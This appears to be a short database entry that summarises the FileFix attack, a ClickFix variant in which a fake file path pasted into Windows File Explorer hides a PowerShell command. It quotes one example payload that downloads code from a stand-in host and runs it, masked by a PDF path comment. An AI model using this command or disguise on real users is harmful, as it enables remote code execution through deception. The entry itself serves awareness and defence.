C1331.title: ClickFix Variant FileFix Attack Tricks Users into Executing PowerShell Commands via Fake File Paths
C1331.summary: Security researcher mr.d0x disclosed the FileFix attack in late June 2025, a variant of ClickFix. The technique tricks users into pasting clipboard content into the Windows File Explorer address bar, where a seemingly normal file path actually contains a malicious PowerShell command such as 'Powershell.exe -c "iwr malicious.site/mal.jpg|iex" # C:\...\Business-RFP.pdf'.
